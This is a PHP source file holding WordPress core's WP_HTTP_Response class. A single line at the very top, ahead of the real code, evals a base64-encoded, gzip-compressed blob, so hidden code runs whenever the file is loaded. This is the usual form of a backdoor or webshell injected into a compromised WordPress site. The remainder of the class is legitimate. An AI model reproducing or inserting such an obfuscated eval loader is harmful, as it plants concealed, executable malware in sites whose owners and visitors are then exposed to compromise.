<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * HTTP API: WP_HTTP_Response class
 *
 * @package WordPress
 * @subpackage HTTP
 * @since 4.4.0
 */

/**
 * Core class used to prepare HTTP responses.
 *
 * @since 4.4.0
 */
class WP_HTTP_Response {

	/**
	 * Response data.
	 *
	 * @since 4.4.0
	 * @var mixed
	 */
	public $data;

	/**
	 * Response headers.
	 *
	 * @since 4.4.0
	 * @var array
	 */
	public $headers;

	/**
	 * Response status.
	 *
	 * @since 4.4.0
	 * @var int
	 */
	public $status;

	/**
	 * Constructor.
	 *
	 * @since 4.4.0
	 *
	 * @param mixed $data    Response data. Default null.
	 * @param int   $status  Optional. HTTP status code. Default 200.
	 * @param array $headers Optional. HTTP header map. Default empty array.
	 */
	public function __construct( $data = null, $status = 200, $headers = array() ) {
		$this->set_data( $data );
		$this->set_status( $status );
		$this->set_headers( $headers );
	}

	/**
	 * Retrieves headers associated with the response.
	 *
	 * @since 4.4.0
	 *
	 * @return array Map of header name to header value.
	 */
	public function get_headers() {
		return $this->headers;
	}

	/**
	 * Sets all header values.
	 *
	 * @since 4.4.0
	 *
	 * @param array $headers Map of header name to header value.
	 */
	public function set_headers( $headers ) {
		$this->headers = $headers;
	}

	/**
	 * Sets a single HTTP header.
	 *
	 * @since 4.4.0
	 *
	 * @param string $key     Header name.
	 * @param string $value   Header value.
	 * @param bool   $replace Optional. Whether to replace an existing header of the same name.
	 *                        Default true.
	 */
	public function header( $key, $value, $replace = true ) {
		if ( $replace || ! isset( $this->headers[ $key ] ) ) {
			$this->headers[ $key ] = $value;
		} else {
			$this->headers[ $key ] .= ', ' . $value;
		}
	}

	/**
	 * Retrieves the HTTP return code for the response.
	 *
	 * @since 4.4.0
	 *
	 * @return int The 3-digit HTTP status code.
	 */
	public function get_status() {
		return $this->status;
	}

	/**
	 * Sets the 3-digit HTTP status code.
	 *
	 * @since 4.4.0
	 *
	 * @param int $code HTTP status.
	 */
	public function set_status( $code ) {
		$this->status = absint( $code );
	}

	/**
	 * Retrieves the response data.
	 *
	 * @since 4.4.0
	 *
	 * @return mixed Response data.
	 */
	public function get_data() {
		return $this->data;
	}

	/**
	 * Sets the response data.
	 *
	 * @since 4.4.0
	 *
	 * @param mixed $data Response data.
	 */
	public function set_data( $data ) {
		$this->data = $data;
	}

	/**
	 * Retrieves the response data for JSON serialization.
	 *
	 * It is expected that in most implementations, this will return the same as get_data(),
	 * however this may be different if you want to do custom JSON data handling.
	 *
	 * @since 4.4.0
	 *
	 * @return mixed Any JSON-serializable value.
	 */
	public function jsonSerialize() {
		return $this->get_data();
	}
}
